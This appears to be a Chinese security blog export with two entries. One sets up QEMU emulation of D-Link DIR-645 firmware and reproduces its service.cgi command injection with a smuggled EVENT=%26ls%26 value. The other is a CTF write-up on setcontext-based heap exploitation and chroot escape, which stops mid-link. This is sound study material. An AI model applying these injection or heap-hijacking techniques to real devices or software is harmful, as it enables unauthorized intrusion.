虚拟机桥接网络</h2><p>这里是给下面 mips 虚拟机打下网络基础的，至于这个 mips 虚拟机作用后面说。qemu apt 装个静态版本就即可。</p><p>我们这步做的是在 ubuntu 虚拟机里面配置一个网桥 br0 ，一端链接宿主机分配，另一端链接 qemu 虚拟机。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装网桥依赖</span></span><br><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br><span class="line"><span class="meta">#</span><span class="bash"> 备份原来配置文件</span></span><br><span class="line">sudo cp /etc/network/interfaces /etc/network/interface.bak</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译配置文件</span></span><br><span class="line">sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>将文件内修改为如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>上面文件中的 <code>ens33</code> 可能需要根据自己系统网卡修改一下，我系统上没有 eht0 这个网卡，当填写网卡名是 eht0 ，等下重启失败，修改为 ens33 则成功。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207140952.png" alt="image-20210207140952068"></p><p>配置完成后，br0 获取宿主机分配的 ip ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318175835.png"></p><p>在其他文章中接下来会配置 qemu 的网络启动脚本，用下来这脚本有点问题，还是手动配置比较香。</p><h2 id="mips-虚拟机"><a href="#mips-虚拟机" class="headerlink" title="mips 虚拟机"></a>mips 虚拟机</h2><p>mips 虚拟机主要是用来给固件一个运行的 linux 环境，后面仿真固件就是将固件放入到里面运行。</p><p>虚拟机需要下载内核文件、磁盘镜像，下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;mips&#x2F;</span><br></pre></td></tr></table></figure><p>大小端根据固件版本自行调整</p><h3 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h3><h4 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h4><p><code>ifconfig</code> 没有查看到 br0 网桥可以手动启动一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 192.168.211.7/24 up</span><br></pre></td></tr></table></figure><ul><li>Br0：网卡名</li><li>192.168.211.7：宿主机（vmware）分配的 ip 段，只有不冲突即可</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318175835.png" alt="配置成功"></p><h4 id="网卡接口"><a href="#网卡接口" class="headerlink" title="网卡接口"></a>网卡接口</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.211.50/24 up</span><br><span class="line">sudo brctl addif br0 tap0</span><br></pre></td></tr></table></figure><ul><li>Tap0：网卡名称，后面 qemu 启动指定用这个网卡</li><li>192.168.211.50：同前一步</li><li><code>brctl addif</code>：网卡链接网桥</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318193211.png" alt="配置成功"></p><h3 id="启动虚拟机"><a href="#启动虚拟机" class="headerlink" title="启动虚拟机"></a>启动虚拟机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure><ul><li>-kernel：指定内核版本</li><li>-hda：指定磁盘镜像</li><li><code>-netdev tap,id=tapnet,ifname=tap0</code>：指定 qemu 网络模式</li></ul><p>登录密码账号均为：<code>root</code>，在 qemu 虚拟机中给网卡配置 ip ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.211.51/24 up</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318194123.png" alt="image-20210318194120389"></p><p>从 qemu 虚拟机 ping 主机：</p><p>![image-20210318194302315](../../../../Library/Application Support/typora-user-images/image-20210318194302315.png)</p><p>从主机 ping qemu 虚拟机：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210318194344.png" alt="image-20210318194340488"></p><h3 id="传输固件"><a href="#传输固件" class="headerlink" title="传输固件"></a>传输固件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r squashfs-root/ root@192.168.211.51:~/</span><br></pre></td></tr></table></figure><p>怎么启动固件系统，每个固件各有差异，结合实际分析。</p><h2 id="IDA-amp-plugin"><a href="#IDA-amp-plugin" class="headerlink" title="IDA &amp; plugin"></a>IDA &amp; plugin</h2><p>mips 反编译可以用 ghidra 或者 IDA7.5 ，下载去看雪、吾爱逛逛</p><p>ida 装两个插件方便审查和查询 gadget ，安装方法看官方 wiki</p><h3 id="mipsAudit"><a href="#mipsAudit" class="headerlink" title="mipsAudit"></a>mipsAudit</h3><p>采用 t3ls 修改版本：<a href="https://github.com/t3ls/mipsAudit">mipsAudit</a></p><h3 id="mipsrop"><a href="#mipsrop" class="headerlink" title="mipsrop"></a>mipsrop</h3><p><a href="https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop">https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop</a></p><h2 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h2><p>个人首选 gdb-multiarch ，偶尔会遇到 gdb 版本差异或者奇异原因而无法调试，然后用 ida 远程调试代替。</p><h3 id="IDA-远程调试（带符号表）"><a href="#IDA-远程调试（带符号表）" class="headerlink" title="IDA 远程调试（带符号表）"></a>IDA 远程调试（带符号表）</h3><p>这里调试时是用 qemu-user 模式用 <code>-g</code> 打开调试端口，确保被调试程序能正常运行，如果不能需要 hook 或者 peach 某些函数。</p><p>将需要调试文件拖到主机上，用 ida 打开程序，然后到 ubuntu -g 打开调试端口。ida 选 remote gdb ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207191440.png" alt="image-20210207191440733"></p><p>前两项都是自动识别文件在 mac 地址，最后一个就 ubuntu 调试端口：</p><blockquote><p>截图是没有打开调试端口，提示连不上</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210207191517.png" alt="image-20210207191516981"></p><h2 id="DIR-645-远程代码执行"><a href="#DIR-645-远程代码执行" class="headerlink" title="DIR-645 远程代码执行"></a>DIR-645 远程代码执行</h2><p>先拿一个 web 洞复现练手，不用写 mips shellcode 。漏洞存在于 <code>/htdocs/cgibin</code> 二进制文件中，原因是 <code>service.cgi</code> 中未经过滤就将用户输入拼接到命令中。</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul><li><p>漏洞固件 <a href="https://tsd.dlink.com.tw/ddgo">Firmware:DIR-645_A1_FW: v1.02b08 (for WW)</a> （tw官网选择 DIR-645 第一个文件）</p><p>版本号为 v1.02（v1.03完成修复）</p></li><li><p>qemu v5.2</p></li><li><p>Ubuntu 18.04</p></li><li><p>ida 7.5</p></li></ul><p>直接运行如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215850.png" alt="image-20210209215850264"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>strrchr</code> 匹配出 <code>/</code> 后面的参数后，<code>strcmp</code> 匹配参数进入各个服务函数：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215638.png" alt="image-20210209215637987"></p><p>定位到 <code>servicecgi_main</code> 。<code>getenv</code> 提取参数依据两种请求方式分别给 v2 赋值，不匹配或为空则退出；提取请求方式后，将参数传入 <code>cgibin_parse_request</code> 解析 http 请求：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209220241.png" alt="image-20210209220241088"></p><p>到里面分别提取<code>REQUEST_URI</code>、 <code>CONTENT_TYPE</code>、<code>CONTENT_LENGTH</code>  ，</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221145.png" alt="image-20210209221145009"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221145.png" alt="image-20210209221145009"></p><p>当解析无误后返回上层函数，然后进入权限认证：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221306.png" alt="image-20210209221306768"></p><p>在这个认证函数内部的函数 <code>sess_get_uid</code> ，可以看到是从 HTTP_COOKIE 里面获取 uid 判断：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221716.png" alt="image-20210209221716723"></p><p>进入 <code> sub_40A950</code> 将 URL ？ 后面部分与关键词匹配，如果一致就开始准备进入拼接命令字符串：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222749.png" alt="image-20210209222749033"></p><p><code>lxmldbc_system</code> 里面将预制指令和 URL 里面参数进行拼接：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222937.png" alt="image-20210209222937398"></p><p>Event 命令字符串为：<code>&quot;event %s &gt; /dev/null&quot;</code> ，中间我们可以加上任意指令比如：<code>&quot;event &amp;ls&amp; &gt; /dev/null&quot;</code></p><p>开始测试前，权限认证那里由于少文件等，要将那个函数 patch 改一下。把跳转 session 改掉不然会卡一段时间，因为仿真没有 <code>/var/session</code> 文件；v1 的复制改为 1 就是代表有权限：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232026.png" alt="image-20210209232026784"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231657.png" alt="image-20210209231657216"></p><p>测试一下，启动命令：</p><blockquote><p>-0：传入第一个参数，进入 servicecgi_main</p><p>-E：选项传入自定义的环境变量</p><p>-strace：显示具体信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p>启动后，报错解析不了：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209230233.png" alt="image-20210209230233246"></p><p>加上调试解析函数看都是解析正确，单步调试就发现是成功解析后执行 retrun 函数并没有返回到上一层，而是继续往下执行 95 行的 retrun v9 这是的 v9 为 -1 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231306.png" alt="image-20210209231306395"></p><p>cataLpa 师傅复现文章也出现相同情况，推测可能是 qemu 仿真问题。这里可以直接改寄存器或者 patch 一下。</p><p>再次启动，这次就正常回显，但是没有运行附加进去的指令：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232205.png" alt="image-20210209232205679"></p><p>附加上 <code>-strace</code> 查看一下详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel -g 1234 -strace \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209233118.png" alt="image-20210209233118432"></p><p>指令已经附加上去，应该是 qemu 环境问题运行不了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/">https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>沙盒堆溢出学习</title>
      <link href="archives/233/"/>
      <url>archives/233/</url>
      
        <content type="html"><![CDATA[<p>在复现 SWPUCTF2020 jailbreak 遇到打开沙盒堆溢出题目，这条题目实际上还有 chroot 逃逸，这个先放后面。沙盒堆溢出利用方法关键是 <code>setcontext()</code> ，以这个点搜寻其他同类题目。年前的高校战役 lgd ，七月份 DASCTF bigbear 。</p><h2 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdlib/setcontext.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setcontext</span><span class="params">(<span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>&#123;</span><br><span class="line">  ……</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其作用是用户上下文的设置，所以我们在可以小范围控制执行流，已知 libc_base 但不足以完成我们的目标时，可以先跳 <code>setcontext+53</code> 来扩大控制范围。简单来说就是<strong>通过 setcontext 控制寄存器的值</strong>。</p><h3 id="setcontext-53-避免-crash"><a href="#setcontext-53-避免-crash" class="headerlink" title="setcontext+53 避免 crash"></a>setcontext+53 避免 crash</h3><p><strong>libc 2.27 下完整 setcontext 如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext&gt;:     push   rdi</span><br><span class="line">&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]</span><br><span class="line">&lt;setcontext+8&gt;:   xor    edx,edx</span><br><span class="line">&lt;setcontext+10&gt;:  mov    edi,0x2</span><br><span class="line">&lt;setcontext+15&gt;:  mov    r10d,0x8</span><br><span class="line">&lt;setcontext+21&gt;:  mov    eax,0xe</span><br><span class="line">&lt;setcontext+26&gt;:  syscall </span><br><span class="line">&lt;setcontext+28&gt;:  pop    rdi</span><br><span class="line">&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001</span><br><span class="line">&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;</span><br><span class="line">&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class="line">&lt;setcontext+44&gt;:  fldenv [rcx]</span><br><span class="line">&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret    </span><br><span class="line">&lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78</span><br><span class="line">&lt;setcontext+135&gt;: neg    eax</span><br><span class="line">&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff</span><br><span class="line">&lt;setcontext+144&gt;: ret</span><br></pre></td></tr></table></figure><p><code>fldenv [rcx]</code>指令会造成程序执行的时候直接crash，所以要避开这个指令，跳转到 setcontext+53 。</p><h3 id="部署堆栈空间控制对应寄存器"><a href="#部署堆栈空间控制对应寄存器" class="headerlink" title="部署堆栈空间控制对应寄存器"></a>部署堆栈空间控制对应寄存器</h3><p>沙盒堆溢出题目利用是将 <code>__free_hook</code> 劫持为 <code>setcontext+53</code> ，当 free 堆块时堆地址作为参数放在 rdi 传入函数中，进入到 setcontext 就会以<strong>堆地址</strong>作为基址，将不同偏移地址上的数据放入寄存器。所以我们需要控制<strong>堆地址</strong>后面空间上的内容。</p><blockquote><p>注意：这里提前布置的数据并不是 srop 中的 frame！！！在其他题目的 wp 中使用 SigreturnFrame() 是方便生成而已，并不是说明填进去的是 frame。比如：</p><p><code>frame.rdi=0x123456</code> 最后 0x123456 是赋值到 rsi &lt;- <code>mov    rsi,QWORD PTR [rdi+0x70]</code></p><p>frame.rdi 的 0x123456 被传入 rsi </p></blockquote><p>构造 rsp 时需要注意 push rcx 的影响，如果 rsp 地址不可访问，程序就会 crash 。</p><h3 id="libc-2-29-之后变化"><a href="#libc-2-29-之后变化" class="headerlink" title="libc 2.29 之后变化"></a>libc 2.29 之后变化</h3><p><strong>libc 2.27 下 setcontext：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+53&gt;:      mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:      mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:      mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:      mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:      mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:      mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:      mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:      mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:      push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:      mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:      mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;:     mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;:     mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;:     mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;:     mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;:     xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;:     ret</span><br><span class="line">&lt;setcontext+128&gt;:     mov    rcx,QWORD PTR [rip+0x398c61]</span><br><span class="line">&lt;setcontext+135&gt;:     neg    eax</span><br><span class="line">&lt;setcontext+137&gt;:     mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">&lt;setcontext+140&gt;:     or     rax,0xffffffffffffffff</span><br><span class="line">&lt;setcontext+144&gt;:     ret</span><br></pre></td></tr></table></figure><p><strong>libc 2.30 下 setcontext：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+52&gt;:      fldenv [rcx]</span><br><span class="line">&lt;setcontext+54&gt;:      ldmxcsr DWORD PTR [rdx+0x1c0]</span><br><span class="line">&lt;setcontext+61&gt;:      mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">&lt;setcontext+68&gt;:      mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">&lt;setcontext+75&gt;:      mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">&lt;setcontext+79&gt;:      mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">&lt;setcontext+83&gt;:      mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">&lt;setcontext+87&gt;:      mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">&lt;setcontext+91&gt;:      mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">&lt;setcontext+95&gt;:      test   DWORD PTR fs:0x48,0x2</span><br><span class="line">&lt;setcontext+107&gt;:     je     0x7f4ea94d71c6 &lt;setcontext+294&gt;</span><br><span class="line">&lt;setcontext+113&gt;:     mov    rsi,QWORD PTR [rdx+0x3a8]</span><br><span class="line">&lt;setcontext+120&gt;:     mov    rdi,rsi</span><br><span class="line">&lt;setcontext+123&gt;:     mov    rcx,QWORD PTR [rdx+0x3b0]</span><br><span class="line">&lt;setcontext+130&gt;:     cmp    rcx,QWORD PTR fs:0x78</span><br><span class="line">&lt;setcontext+139&gt;:     je     0x7f4ea94d7165 &lt;setcontext+197&gt;</span><br><span class="line">&lt;setcontext+141&gt;:     mov    rax,QWORD PTR [rsi-0x8]</span><br><span class="line">&lt;setcontext+145&gt;:     and    rax,0xfffffffffffffff8</span><br><span class="line">&lt;setcontext+149&gt;:     cmp    rax,rsi</span><br><span class="line">&lt;setcontext+152&gt;:     je     0x7f4ea94d7140 &lt;setcontext+160&gt;</span><br></pre></td></tr></table></figure><p>原来是以 rdi 作为基地址，在 libc 2.29 之后以 rdx 作为基地址。</p><h2 id="SWPUCTF2020-jailbreak"><a href="#SWPUCTF2020-jailbreak" class="headerlink" title="SWPUCTF2020 jailbreak"></a>SWPUCTF2020 jailbreak</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;ctf&#x2F;work&#x2F;jailbreak&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序限制操作次数，以及（正常情况下）允许分配的堆 size 总数，这个数存放在堆上：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201226011019.png" alt="image-20201226011019096"></p><p>程序初始化时调用 chroot 改变根目录：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201226005504.png" alt="image-20201226005504441"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>自定义输入函数存在 off by one ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210109134708.png" alt="image-20201226005326707"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>libc 地址怎么都是要知道的，题目限制申请总 size ，先用 tcache 泄露堆地址。offbyone 创造出 tcachebin 重叠空间，修改在 tcachebin 中的堆得 fd 指针，指向到 size 所在空间，调大 size 。</p><p>重复上面构成堆重叠步骤在 tcache struct 上申请一个堆控制索引数量，将 0x90 索引数量调成 8 。溢出修改 size 位伪造出一个 0x90 的堆释放进入 unsortedbin 泄露地址。</p><p>重复上面构造堆重叠步骤修改 tcachebin fd 指针指向 free_hook ，将 tcache bin 其中一个开头地址修改为 __free hook 用于修改其值位 setcontent+53 。同时部署 setcontext 的上下文。利用 setcontext 构建出一个 read 写入，写入 ROP 链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行chdir(fd)来实现chroot逃逸</span><br><span class="line">ORW 读取 flag</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>本地复现时在 18.04 系统里面跑，没有 chroot 等等限制。。。将 __free_hook 改 onegadget 就 getshell 了。后面放到 docker 各种限制就又出现了。。。</p><blockquote><p>官方WP：<a 